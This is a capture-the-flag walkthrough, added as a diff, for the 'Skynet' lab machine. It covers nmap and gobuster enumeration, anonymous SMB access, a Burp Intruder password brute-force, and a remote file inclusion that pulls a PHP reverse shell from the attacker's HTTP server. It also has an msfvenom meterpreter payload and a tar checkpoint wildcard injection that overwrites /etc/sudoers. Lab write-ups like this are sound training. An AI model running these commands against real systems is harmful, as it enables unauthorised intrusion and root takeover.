@@ -1,0 +1,138 @@
+#SKYNET
+
+
+IP : 10.10.226.139 
+
+
+//////  Started with nmap command :   \\\\\\
+
+-A -sC -sV -T4 -oN skynet.txt 10.10.226.139
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
+|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
+|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Skynet
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: UIDL CAPA SASL AUTH-RESP-CODE RESP-CODES PIPELINING TOP
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: more ID OK have SASL-IR Pre-login IDLE LOGINDISABLEDA0001 LITERAL+ ENABLE post-login LOGIN-REFERRALS IMAP4rev1 capabilities listed
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2022-05-19T03:55:44
+|_  start_date: N/A
+|_clock-skew: mean: 1h39m56s, deviation: 2h53m12s, median: -3s
+|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET\x00
+|   Domain name: \x00
+|   FQDN: skynet
+|_  System time: 2022-05-18T22:55:43-05:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed May 18 23:55:53 2022 -- 1 IP address (1 host up) scanned in 48.66 seconds
+
+
+/// Then ran gobuster for enumerate for directories with the /usr/share/wordlists/dirb/common.txt \\\\
+
+The squirrelmail directory was returned back to me 
+
+
+///// Running sbmclient against the IP returned a few shares, being: 
+
+smbclient -N -L \\\\10.10.226.139
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        anonymous       Disk      Skynet Anonymous Share
+        milesdyson      Disk      Miles Dyson Personal Share
+        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            SKYNET
+
+
+
+///// now its time to check out the anonymous share \\\\\
+
+
+smbclient //IP/anonymous -U anonymous
+checking out the logs we got the password list 
+
+now we have our username and a list of possible passwords, its time to fire up burpsuite
+
+After running burpsuite intruder with the password list, the only one with a 302 redirect was --->    cyborg007haloterminator
+
+after logging into his email there was a file with his password for his smb share
+
+after checking out his notes/important.txt we are given a new directory to enumerate :    ----->    /45kra24zxs28v3yd
+
+
+after enumerating this directory with gobuster again we find the /administator login to which is vulnerable to remote file inclusion letting us get a reverse shell on the server
+
+
+so a quick download from pentestmonkey's rev_shell.php and an edit in the file to place our IP in there and were onto the next step of what are some good RFI extentions
+
+
+now we just have to serve the file on our side with python3 -m http.server 8080
+
+
+45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=
+
+after the '=' we have to put the path to our payload we have on the server and set up the netcat listener on the port we chose
+
+nc -lnvp 1234
+
+connection recieved! Hell yeah! alright, this shell is terrible, time for some meterpreter
+
+generate a linux payload with msfvenom like so:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="IP" LPORT="port" -f elf > whatever.elf
+
+now server another python server the same way and wget the file into the /tmp directory because it is world writeable
+
+##### keep in mind we should not close any of the netcat connections made leave all listeners open #######
+
+now we have a better shell, simply spawn a tty shell with python : 
+python -c 'import pty; pty.spawn("/bin/sh")'
+then type 'bash' for a user shell with a path
+
+now we should enumerate the system with linpeas.sh 
+
+doing so we dont really find much other than we can do some tar stuff, so technically anything in the directory getting tar'd will be ran
+
+after some reading I decided the best route would be to see if i can overwrite the sudoers file with a ALL-(root) NOPASS: ALL for www-data
+
+so lets echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > esc.sh
+
+then some checkpoint stuff
+
+echo "/var/www/html" > "--checkpoint-action=exec=sh esc.sh"
+echo "/var/www/html" > --checkpoint=1
+
+then we just have to set up out listener and wait!!
+
+
+
